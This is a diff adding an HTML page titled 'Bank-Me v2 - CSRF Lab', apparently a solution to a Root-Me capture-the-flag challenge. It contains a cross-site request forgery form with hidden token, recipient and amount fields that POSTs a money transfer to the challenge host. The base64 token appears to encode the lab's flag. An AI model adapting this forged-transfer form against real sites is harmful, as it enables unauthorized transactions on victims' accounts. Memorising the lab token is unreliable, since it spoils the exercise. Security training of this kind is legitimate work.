@@ -1,0 +1,28 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank-Me v2 - CSRF Lab</title>
+</head>
+<body>
+    <h1>Bank-Me v2 - CSRF Lab</h1>
+
+    <form
+        action="https://instance-01a217fb-5e63-7168-a047-6c795ed13ff5.challenges.root-me.pro/transfer"
+        method="POST">
+
+        <input type="hidden" name="token"
+            value="Q1NSRnNfNHIzX2MwMGw6ZnJhbmNrX3YyOjEwMA==">
+
+        <input type="hidden" name="recipient"
+            value="franck_v2_test">
+
+        <input type="hidden" name="amount"
+            value="1">
+
+        <button type="submit">Effectuer le transfert de test</button>
+    </form>
+</body>
+</html>
